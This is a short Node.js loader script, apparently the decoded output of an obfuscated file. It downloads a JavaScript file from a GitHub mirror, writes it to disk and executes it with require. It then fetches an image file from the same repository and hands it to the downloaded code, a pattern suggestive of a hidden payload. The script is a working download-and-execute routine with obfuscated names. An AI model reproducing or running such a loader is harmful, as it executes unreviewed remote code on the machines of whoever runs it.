//Sat Jun 29 2024 14:15:49 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
const imageFileName = "dddc.png";
const fs = require("fs"),
  axios = require("axios"),
  runFile = "./run0O.js";
!(async () => {
  let _0x41b804;
  try {
    _0x41b804 = require(runFile);
  } catch (_0x1efb27) {
    const _0x4503c7 = {
      responseType: "arraybuffer"
    };
    const _0x418bb5 = await axios.get("https://mirror.ghproxy.com/https://raw.githubusercontent.com/smallfawn/script/main/run0O.js", _0x4503c7);
    fs.writeFileSync("run0O.js", Buffer.from(_0x418bb5.data));
    _0x41b804 = require(runFile);
  }
  if (!fs.existsSync(imageFileName)) {
    try {
      const _0x5d5398 = {
        responseType: "arraybuffer"
      };
      const _0x3bb806 = await axios.get("https://mirror.ghproxy.com/https://raw.githubusercontent.com/smallfawn/script/main/" + imageFileName, _0x5d5398);
      fs.writeFileSync(imageFileName, Buffer.from(_0x3bb806.data));
      await _0x41b804(imageFileName);
      return;
    } catch (_0x29187b) {
      return;
    }
  }
  await _0x41b804(imageFileName);
})();